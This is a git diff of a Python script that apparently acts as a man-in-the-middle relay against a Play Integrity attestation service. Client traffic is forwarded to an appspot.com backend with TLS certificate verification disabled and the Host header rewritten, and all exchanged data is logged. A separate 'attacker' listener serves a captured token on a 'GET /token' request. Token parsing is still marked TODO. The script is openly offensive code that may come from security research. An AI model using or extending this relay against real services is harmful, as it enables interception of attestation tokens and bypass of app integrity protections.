@@ -13,27 +13,36 @@ from dataclasses import dataclass
 HOST = "0.0.0.0"
 ATTACKER_PORT = 45565
 CLIENT_PORT = 80
-REMOTE_HOST = "https://play-integrity-9xfidw6bru2nqvd.ue.r.appspot.com"
+REMOTE_HOST = "play-integrity-9xfidw6bru2nqvd.ue.r.appspot.com"
 REMOTE_PORT = 443
 
 
 @dataclass
 class ClientData:
     token: str
-    request: str
 
 
 def attacker_request_handler(conn, addr, client_data):
     """
     Accept the connection and send the token
-    :param conn:
-    :param addr:
-    :param client_data:
-    :return:
+    :param conn: attacker connection object
+    :param addr: attacker address
+    :param client_data: data about the client
+    :return: None
     """
     print(f"Connected to attacker {addr}")
     with conn:
-        conn.sendall(b"{token:\"" + client_data.token.encode() + b"\"}")
+        total_data = b""
+        #while True:
+        data = conn.recv(1024)
+        #    if not data:
+        #        break
+        total_data += data
+        if b"GET /token" in total_data:
+            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\":\"" +
+                         client_data.token.encode() + b"\"}")
+        else:
+            conn.sendall(b"HTTP/1.1 404 Not Found\r\n\r\n")
 
 
 def client_request_handler(conn, addr, client_data):
@@ -48,36 +57,48 @@ def client_request_handler(conn, addr, client_data):
     # set up variable to keep track of what was received from the client
     total_data_client = b""
 
+    # set up variable to keep track of what was received from the application server
+    total_data_server = b""
+
+    # set up SSL Context
+    ssl_context_instance = ssl.SSLContext(protocol=ssl.PROTOCOL_TLS_CLIENT)
+    ssl_context_instance.check_hostname = False
+    ssl_context_instance.verify_mode = ssl.CERT_NONE
+
     with conn:
         print(f"Connected to {addr}")
-        while True:
-            data = conn.recv(1024)
-            if not data:
-                break
-            total_data_client += data
-        if b"/performCommand" in total_data_client:
+        #while True:
+        data = conn.recv(4096)
+            #if not data:
+            #    break
+        total_data_client += data
+
+        if b"Host: localhost" in total_data_client:
+            total_data_client = total_data_client.replace(b"Host: localhost",
+                                                          b"Host: play-integrity-9xfidw6bru2nqvd.ue.r.appspot.com")
+
+        if b"POST /performCommand" in total_data_client:
             # TODO figure out how to parse this to get the token
             print(total_data_client)
         else:
             # set up client socket to relay information to the application server
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientSock:
-                with ssl.wrap_socket(clientSock, ssl_version=ssl.PROTOCOL_TLS_CLIENT) as tlsClientSock:
+                with ssl_context_instance.wrap_socket(sock=clientSock) as tlsClientSock:
                     tlsClientSock.connect((REMOTE_HOST, REMOTE_PORT))
-
-                    # set up variable to keep track of what was received from the application server
-                    total_data_server = b""
 
                     # forward the data to the application server
                     tlsClientSock.sendall(total_data_client)
 
                     # receive the response from the application server
-                    while True:
-                        data = tlsClientSock.recv(1024)
-                        if not data:
-                            break
-                        total_data_server += data
+                    #while True:
+                    data = tlsClientSock.recv(4096)
+                    #    if not data:
+                    #        break
+                    total_data_server += data
                     # forward the data back to the client
                     conn.sendall(total_data_server)
+        print(str(addr) + " sent this data to the server: " + str(total_data_client) +
+              "\nand received response: " + str(total_data_server))
 
 
 def attacker_server(client_data):
@@ -116,7 +137,7 @@ def main():
     :return: None
     """
     # Create data storage object
-    client_data = ClientData("", "")
+    client_data = ClientData("")
 
     # Create and start attacker and client threads
     attacker = threading.Thread(target=attacker_server, args=(client_data,))
